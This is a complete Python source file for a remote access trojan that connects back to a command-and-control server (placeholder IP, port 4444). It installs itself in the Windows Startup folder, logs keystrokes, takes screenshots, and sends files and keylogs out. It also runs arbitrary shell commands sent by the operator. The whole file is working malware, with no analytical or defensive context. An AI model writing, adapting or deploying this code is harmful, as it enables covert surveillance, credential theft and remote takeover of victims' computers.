import socket
import subprocess
import os
import sys
import time
import platform
import pyautogui
import threading
from pynput import keyboard

# Configuration
CNC_IP = "your_cnc_ip"  # Replace with your C&C server IP
CNC_PORT = 4444         # Replace with your C&C server port
BUFFER_SIZE = 1024 * 128  # 128KB buffer size

# Keylogger
class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            self.log += str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                self.log += " "
            elif key == keyboard.Key.enter:
                self.log += "\n"
            else:
                self.log += f" [{key}] "

    def start(self):
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()

# Persistence (Windows only)
def add_to_startup():
    if platform.system() == "Windows":
        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        script_path = os.path.abspath(sys.argv[0])
        if not os.path.exists(os.path.join(startup_folder, os.path.basename(script_path))):
            os.system(f'copy "{script_path}" "{startup_folder}"')

# Execute commands
def execute_command(cmd):
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return str(e.output.decode())

# File upload
def upload_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, "rb") as file:
            return file.read()
    return b"File not found."

# File download
def download_file(file_name, file_data):
    with open(file_name, "wb") as file:
        file.write(file_data)
    return f"File {file_name} downloaded."

# Screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    with open("screenshot.png", "rb") as file:
        return file.read()

# Send message to target
def send_message(message):
    pyautogui.alert(message, title="Message from C&C")

# Main RAT loop
def main():
    # Add to startup (Windows only)
    add_to_startup()

    # Start keylogger
    keylogger = Keylogger()
    keylogger_thread = threading.Thread(target=keylogger.start)
    keylogger_thread.daemon = True
    keylogger_thread.start()

    # Connect to C&C server
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((CNC_IP, CNC_PORT))
            break
        except Exception as e:
            time.sleep(10)  # Retry connection every 10 seconds

    while True:
        try:
            # Receive command from C&C server
            cmd = s.recv(BUFFER_SIZE).decode().strip()

            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "screenshot":
                screenshot_data = take_screenshot()
                s.send(screenshot_data)
            elif cmd.startswith("upload"):
                _, file_name = cmd.split(" ", 1)
                file_data = upload_file(file_name)
                s.send(file_data)
            elif cmd.startswith("download"):
                _, file_name, file_data = cmd.split(" ", 2)
                response = download_file(file_name, file_data.encode())
                s.send(response.encode())
            elif cmd.lower() == "keylog":
                s.send(keylogger.log.encode())
                keylogger.log = ""  # Clear the log after sending
            elif cmd.startswith("msg"):
                _, message = cmd.split(" ", 1)
                send_message(message)
                s.send("Message sent.".encode())
            else:
                # Execute the command and send the output
                output = execute_command(cmd)
                s.send(output.encode())
        except Exception as e:
            s.send(f"Error: {str(e)}".encode())

    s.close()

if __name__ == "__main__":
    main()
